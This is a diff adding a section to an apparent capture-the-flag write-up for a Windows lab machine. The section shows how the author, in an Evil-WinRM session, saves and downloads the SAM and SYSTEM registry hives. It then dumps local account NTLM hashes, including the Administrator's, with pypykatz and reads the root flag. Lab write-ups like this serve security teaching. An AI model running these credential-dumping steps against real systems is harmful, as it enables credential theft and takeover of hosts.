@@ -305,6 +305,49 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 ```
 
+Save reg SAM and SYSTEM hives and download them
+```powershell
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\sam sam
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system system
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download sam
+                                        
+Info: Downloading C:\Users\emily.oscars.CICADA\Documents\sam to sam
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> download system
+                                        
+Info: Downloading C:\Users\emily.oscars.CICADA\Documents\system to system
+                                        
+Info: Download successful!
+```
+
+
+Extract the SAM hive secrets with `pypykatz`.
+```bash
+pypykatz registry --sam sam system
+
+WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
+WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
+============== SYSTEM hive secrets ==============
+CurrentControlSet: ControlSet001
+Boot Key: 3c2b033757a49110a9ee680b46e8d620
+============== SAM hive secrets ==============
+HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+Root flag in Administrator desktop
+```powershell
+*Evil-WinRM* PS C:\Users\Administrator\Documents> more ../Desktop/root.txt
+```
+
 ## Enumeration
 
 
